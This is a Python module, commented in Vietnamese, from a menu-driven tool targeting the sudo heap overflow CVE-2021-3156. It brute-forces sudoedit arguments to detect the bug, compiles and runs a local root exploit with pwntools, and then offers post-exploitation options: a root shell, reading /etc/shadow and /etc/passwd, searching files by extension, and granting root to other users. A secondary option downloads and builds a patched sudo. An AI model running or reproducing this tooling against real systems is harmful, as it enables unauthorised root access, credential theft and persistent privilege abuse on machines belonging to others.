'''
b1: xây dựng file leo quyền
b2: build file leo quyền thành libc
b3: xây dựng file exploit 
b4: buid file exploit
b5: chạy file exploit
'''

from pwn import process
from importFile import root_directory,shlex,subprocess,os,is_exist_bug
from executeCommand import executeInteractive, executeOnce
from formatOutput.prettyAnnounce import log,bcolors
import importFile
from util import *
from findInfoSystem import is_Linux
from menu_list import entry_dynamic_menu

exploit_executable_name = 'poc'
lpe_libc_name = 'lpe_libc.so.2'
module_root_path = root_directory + "/linux/cve_2021_3156/"
exploit_src_path = module_root_path+'exploit.c'
exploit_executable_path = module_root_path+'poc'
lpe_src_path = module_root_path + "lpe_libc.c"
lpe_dir = module_root_path +"libnss_a"

def check_version():
    command = ['sudo', '-V']
    output = subprocess.run(command,capture_output=True)
    print(output.stdout.decode())

def check_vuln():
    is_vuln = False
    if(is_Linux()==False):
        log.fail("Hệ thống của bạn không phải linux ! Thoát chương trình !")
        exit(1)
    else:
        error_key = b'malloc():'
        count_try = 1
        for len_a in range(0,50):
            for len_b in range(0,200):
                log.info(f"Brute force lần {count_try}")
                count_try+=1
                brute_force_argument = [
                    "/usr/bin/sudoedit",
                    '-s',
                    'a'*len_a+'\\',
                    'b'*len_b
                ]
                try:
                    output = subprocess.run(
                        brute_force_argument,
                        stdout=subprocess.PIPE,stderr=subprocess.PIPE,
                        timeout=1)
                    if(error_key in output.stderr 
                        or error_key in output.stdout 
                        or output.returncode < 0):
                        is_vuln = True
                        return is_vuln
                except:
                    print('\n')
                    pass 
        return is_vuln

def build_get_root_libc():
    '''
    Compile file get root libc thành shared libc
    '''
    if(is_path_exist(lpe_dir) == True):
        log.info("Phát hiện thư mục shared object cũ ! Thực hiện xoá !")
        executeOnce(f"rm -rf {lpe_dir}")
    log.info("Khởi tạo thư mục shared object mới")
    executeOnce(f"mkdir {lpe_dir}")
    log.done("Khởi tạo thư mục shared object mới thành công !")
    log.info("Biên dịch source tạo thành đối tượng shared libc !")
    check = executeOnce(f"gcc -fPIC -shared -o {lpe_dir}/{lpe_libc_name} {lpe_src_path}")
    # print(check)
    if(b'error' in check.stderr):
        log.fail("Biên dịch thất bại, xin hãy báo cáo với admin !")
        return False
    else:
        log.done(f"Biên dịch thành công, shared libc nằm ở thư mục {lpe_dir}")
        return True

def build_exploit():
    '''
    Compile file exploit thành file thực thi
    '''
    
    if(is_path_exist(exploit_src_path)==True):
        log.info("Biên dịch mã nguồn khai thác lỗi.")
        check = executeOnce(f"gcc -std=c99 -o {module_root_path}/poc {exploit_src_path}")
        # print(check)
        if(check.returncode<0):
            log.fail("Biên dịch thất bại, xin hãy báo cáo với admin !")
            return False
        else:
            log.done(f"Biên dịch thành công, tệp thực thi khai thác nằm ở thư mục {module_root_path}/poc")
            return True

def run():
    clean_terminal()
    os.chdir(module_root_path)
    if(build_get_root_libc() == True and build_exploit()==True):
        log.info("Bắt đầu chạy tệp tin khai thác !")
        s = process(exploit_executable_path)
        # s.interactive()
        s.sendline('id')
        output = s.recvline()
        if(b'root' not in output):
            log.fail("Khai thác thất bại! Không thể lấy quyền root! Liên lạc admin!")
        else:
            log.info("Khai thác thành công! Khởi động các công cụ hỗ trợ!")
            # s.sendline('export TERM=linux; export TERMINFO=/etc/terminfo')
            stop_terminal()
            # promt = succes_promt(s)
            # promt.cmdloop()
            after_exploit_tools(s)

def fix_bug():
    '''
    Thực hiện các bước vá lỗi cve 2021-3156
    B1: tải bản vá
    B2: giải nén bản vá
    B3: cài đặt bản vá
    '''
    log.warning("Chức năng này yêu cầu thực thi với quyền root do đó bạn cần cung cấp mật khẩU !")
    log.warning("Bạn có đồng ý thực hiện chức năng không? [y/n]")
    choice = str(input(">>> ").strip('\n'))
    while(choice not in ['y','n']):
        log.warning("Lựa chọn không hợp lý! Xin hãy nhập đúng lựa chọn!")
        choice = input(">>> ")
    
    if(choice == 'n'):
        return
    elif choice == 'y':
        # variable definition
        destionation_path = module_root_path+'patched_dir'
        file_name = 'sudo-1.9.5p2.tar.gz'
        decompress_folder = 'sudo-1.9.5p2'
        setup_folder = destionation_path+'/'+decompress_folder
        # end definition
        '''
            - kiem tra su ton tai cua thu muc chua file pactched
            - di chuyen den thu muc chua file patched
            - tai file
            - check ton tai file vua tai
            - giai nen
            - kiem tra su ton tai cua thu muc vua giai nen
            - di den thu muc setup
            - thuc hien cac lenh cap nhat va cai dat 
        '''
        if(is_path_exist(destionation_path)==False):
            os.mkdir(destionation_path)
        os.chdir(destionation_path)
        check_download = download_file('https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz',file_name,destionation_path)
        if(check_download == 1 and is_path_exist(destionation_path+"/"+file_name)):
            
            log.done("Đã tải xong tệp vá lỗi!")
            log.info("Giải nén tệp vá lỗi!")

            check_decompress = decompress_gz(destionation_path+'/'+file_name)
            if check_decompress >= 0:
                log.done("Giải nén thành công!")
                log.info("Cài đặt tệp vá lỗi!")
                
                if is_path_exist(setup_folder):
                    os.chdir(setup_folder)
                    log.info("Cập nhật apt")
                    print_check_stdout_stderr(executeOnce('sudo apt-get update'))
                    log.info("Cài đặt công cụ biên dịch Make")
                    print_check_stdout_stderr(executeOnce("sudo apt-get install make"))
                    log.info("Cài đặt công cụ Buid-esssential")
                    print_check_stdout_stderr(executeOnce('sudo apt-get install build-essential'))
                    log.info("Kiểm tra cài dặt trước khi cập nhật sudo")
                    print_check_stdout_stderr(executeOnce('sudo ./configure'))
                    log.info("Make và cài đặt sudo")
                    print_check_stdout_stderr(executeOnce('sudo make'))
                    print_check_stdout_stderr(executeOnce('sudo make install'))
                else:
                    log.fail(f"Không tồn tại thư mục {setup_folder}! Xảy ra lỗi nghiêm trọng.")
        stop_terminal()

def entry_menu():
    while(1):
        clean_terminal()
        options_l = ["Khai thác cve", "Vá lỗ hổng"]
        choice = entry_dynamic_menu(options_l,len(options_l),'[cve_2021_3156]')
        if(choice == '0'):
            return
        elif choice == '1':
            run()
        elif choice == '2':
            fix_bug()

def entry():
    '''
    Đầu vào cho cve
     - Kiểm tra có dính lỗi?
        + Thoát nếu không
        + Vào menu chức năng, nếu có
    '''
    clean_terminal()

    log.info("Brute force hệ thống để tìm lỗi\n".upper())
    global is_exist_bug
    if is_exist_bug ==-1:
        if check_vuln() == True:
            is_exist_bug = 1
        else:
            is_exist_bug = 0
    if(is_exist_bug == 1):
        print(end='\n')
        log.warning("Hệ thống phát hiện lỗi\n".upper())
        stop_terminal()
        entry_menu()
    else:
        log.info("Hệ thống của bạn không có lỗi này! Ấn Enter để trở lại (Enter) !")

class exploit_tools():
    
    def __init__(self, proc:process):
        self.proc = proc

    def is_alive(self):
        if self.proc.poll() == None:
            return True
        else:
            return False
    def shutdown_root_process(self):
        self.proc.close()
        self.proc.wait_for_close()

    # def do_exit(self, arg):
    #     '''Thoát giao diện giao tiếp root'''
        
    #     self.proc.close()
    #     log.done("Đóng root shell!")
    #     log.done("Thoát tiến trình khai thác!")
    #     stop_terminal()
    #     return -1
    
    def do_shell(self):
        '''
        Trực tiếp thao tác trên shell bằng quyền của root
            - qexit để thoát khỏi shell
            - exit để đóng root shell (không thể truy cập lại)
        '''
        while(1):
            promt_symbols = f"{bcolors.FAIL}# {bcolors.ENDC}"
            command = str(input(promt_symbols)).strip('\n')
            if(command == 'qexit'):
                log.info("Thoát root shell!")
                break
            elif(command == 'exit'):
                ret_value = yes_no_ask("Bạn có chắc muốn thoát cả tiến trình khai thác hay không? \n Gợi ý: qexit để thoát chức năng shell.")
                if(ret_value == 1):
                    self.shutdown_root_process()
                    break
                elif ret_value == -1: #chưa muốn thoát
                    continue
            elif(command == ''):
                continue
            else:
                cmd_out = root_do_and_response(self.proc,command)
                if(cmd_out == -2):
                    log.fail("Tiến trình root shell đã chết!")
                    return 0
                else:
                    print(cmd_out)

    
    def do_list_process(self,arg):
        '''
        Cách sử dụng:

        list_process [normal/root]

        normal : Lấy thông tin các tiến trình trên hệ thống với quyền user thường
        root   : lấy thông tin các tiến trình trên hệ thống với quyền user root

        ví du: list_process root
        Kết quả:
        [*]  USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
        [*]  root         1  0.0  0.0    900   532 ?        Sl   09:38   0:00 /init
        '''
        if arg == 'root':
            process_l = list_process_as_root(self.proc)
        else:
            process_l = list_process()

        if process_l == -1:
            log.fail("Hệ điều hành của bạn không phải linux! Chức năng chưa được xây dựng!")
        else:
            for line in process_l:
                log.info(line)
    
    def do_leak(self,arg):
        '''
        Lấy thông tin của file user và passwd
        Cách sử dụng:
        leak [passwd/shadow]

        passwd: file chứa mật khẩu của tất cả user trên hệ thống
        shadow: file chứa tất cả user trên hệ thống
        '''
        reponse = leak(arg, self.proc)
        if(reponse == -1):
            log.fail("Đối số của câu lệnh không đúng !")
        else:
            for line in reponse:
                log.info(line)

    def do_tree_path(self,mode,path):
        '''
        Liệt kê các tệp tin trong đường dẫn được cung cấp

        Cách sử dụng:
        tree_path [-option] [path]
        
        option:
            -v: chế độ chi tiết, liệt kê tất cả: thư mục, tệp tin, tệp ẩn,...
                Lưu ý: trong chế độ này, không nên chọn thư mục có quá nhiều tệp tin sâu, như / (root path), /usr, /home,...
                Sẽ tốn thời gian rất lâu để liệt kê hết. 
            -d: chế độ chỉ xem các tệp là thư mục. 
        ví dụ: 
                root >>> tree_path -d /
                ├── home
                ├── srv
                ├── etc
                ├── opt
                ├── root
                ├── lib
                ├── mnt
        ví dụ: 
                root >>> tree_path -v /home/cheaterdxd/dttn/
                ├── linux
                │   ├── readme.txt
                │   └── cve_2021_3156
                │       ├── __pycache__
                │       │   ├── run_exploit.cpython-310.pyc
                │       │   └── run_exploit.cpython-36.pyc
                │       ├── lpe_libc.c
                │       ├── run_exploit.py
                │       ├── libnss_a
                │       │   └── lpe_libc.so.2
                │       ├── exploit.c
                │       └── poc
        '''



        if(mode == 'v'):
            color_verbose_ls(ls_verbose(self.proc,path),path)
        else:
            color_ls(ls_normal(self.proc,path))

    def do_findext(self, path_find, file_ext):
        '''
        Liệt kê tất cả các file theo định dạng đuôi
        [directory to find]
        [file ext]
        '''

        list_f_resp = list_ext_at_path_by_root(self.proc,path_find,file_ext)
        if(len(list_f_resp)==0):
            log.info("Không có kết quả nào tìm được!")
        else:
            for f in list_f_resp:
                log.info(f)
        
    def do_gain_root(self,user_):
        '''
        nâng quyền cho user
        '''
        return up_root_for_exist_user(self.proc,user_)

def after_exploit_tools(exploit_process:process):
    tools_list = [
        'Tạo root shell',
        'Lấy danh sách tiến trình [người dùng thường]',
        'Lấy danh sách tiến trình [administrator]',
        'Đọc tệp tin mật khẩu shadow',
        'Đọc tệp tin các tất cả các người dùng hiện có trong hệ thống',
        'Sơ đồ thư mục dạng cây',
        'Tìm kiếm tệp tin theo đuôi mở rộng',
        'Nâng quyền người dùng đã tồn tại thành root'
    ]
    # tạo đối tượng của class exploit_tools
    tools = exploit_tools(exploit_process)
    while(tools.is_alive()):
        clean_terminal()
        choice_tool = entry_dynamic_menu(tools_list,len(tools_list),">>>",bcolors.OKGREEN, bcolors.FAIL)
        if(choice_tool == '0'):
            tools.shutdown_root_process()
            return 0
        elif choice_tool == '1':
            tools.do_shell()
        elif choice_tool == '2':
            user_type = 'normal'
            tools.do_list_process(user_type)
        elif choice_tool == '3':
            user_type = 'root'
            tools.do_list_process(user_type)
        elif choice_tool == '4':
            tools.do_leak('shadow')
        elif choice_tool == '5':
            tools.do_leak('passwd')
        elif choice_tool == '6':
            '''
            lấy path
            lấy mode
            thực thi
            '''
            in_use_mode = True
            while(in_use_mode):
                mode = ['''
                Chế độ cụ thể xem với đệ quy thư mục
                ├── linux
                │   ├── readme.txt
                │   └── cve_2021_3156
                │       ├── __pycache__ ''','''
                Chế độ chỉ xem các thư mục trong đường dẫn
                ├── home
                ├── srv
                ├── etc
                ├── opt
                ''']
                mode_choice = 0

                mode_choice = int(entry_dynamic_menu(mode,len(mode),'(mode)',symbols_color=bcolors.OKCYAN),10)

                if(mode_choice == 1):
                    mode_choice = 'v'
                elif mode_choice == 2:
                    mode_choice = 'd'
                elif mode_choice == 0:
                    in_use_mode = False
                    break
                else:
                    log.fail("Không nhận ra chế độ ! BUG DETECT")
                while(True):
                    path_ = ''.join(str(input("Nhập đường dẫn muốn xem: ")).split())
                    if(path_==''):
                        continue 
                    tools.do_tree_path(mode=mode_choice,path=path_)

                    log.info(f"Bạn đang sử dụng chế độ {mode_choice}")
                    log.info(f"Nhập 0 để quay lại menu hoặc bất kỳ phím khác để tiếp tục chế độ")
                    try:
                        ret_ = int(input("").strip("\n"),10)
                        if(ret_ == 0):
                            break
                    except:
                        pass 
        elif choice_tool == '7':
            ext_ = ''
            path_ = ''
            # p1: lấy thông tin
            while(path_ == ''):
                path_ = str(input("Nhập đường dẫn muốn tìm\n>>> ")).strip('\n')
            # in các thông tin có sẵn
            ext = 'txt pdf bat xls doc docx sh xml py c exe md'
            list_ext = ext.split(' ')
            list_ext.sort()
            idx = 1
            for e in list_ext:
                print(f'{idx}.{e}')
                idx+=1
            print('0. Khác')
            is_loop = False
            # check input
            while(not is_loop):
                try:
                    ext_choice = int(input("(Chọn số) ").strip('\n'),10)
                    if(ext_choice >= 0 and ext_choice <= (len(list_ext)-1)):
                        # đÚng
                        is_loop = True
                    else:
                        log.fail("Bạn đã nhập sai giá trị. Mời nhập lại!")
                except ValueError:
                    log.fail("Chỉ nhập số để lựa chọn!")
            # lấY thông tin thành cong và thực hiện câu lệnh
            if ext_choice == 0:
                ext_ = str(input("Nhập đuôi mở rộng mà muốn tìm\n>>> ")).strip('\n')
            else:
                ext_ = list_ext[ext_choice-1]
            log.warning("Kết quả tìm kiếm")
            tools.do_findext(path_find=path_ , file_ext=ext_)
        elif choice_tool == '8':
            user = ''
            while(user == ''):
                user = str(input("Nhập tên user muốn nâng quyền\n>>> ").strip('\n'))
            is_up_root_successed = tools.do_gain_root(user)
            if(is_up_root_successed==0):
                log.info(f"Nâng quyền thành công cho {user}")
            else:
                log.info(f"Nâng quyền thất bại cho {user}")
        stop_terminal()

